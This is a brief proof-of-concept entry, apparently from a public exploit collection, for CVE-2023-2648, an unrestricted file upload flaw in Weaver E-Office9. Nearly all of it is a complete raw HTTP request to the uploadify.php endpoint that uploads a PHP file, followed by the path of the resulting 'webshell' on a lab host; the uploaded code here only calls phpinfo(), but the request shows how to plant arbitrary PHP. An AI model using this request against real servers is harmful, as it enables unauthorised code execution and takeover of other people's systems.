## 某微E-Office9文件上传漏洞 CVE-2023-2648

```
POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: :8085
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
Content-Length: 491

--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
Content-Disposition: form-data; name="Filedata"; filename="666.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream

--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
```
![2070a628d476b95724b6b017a3430a45](https://github.com/wy876/POC/assets/139549762/ea43a9b8-d146-49ae-86ce-f28e5b15c185)

webshell路径
```
http://10.211.55.3:8082/attachment/1727543347/666.php
```
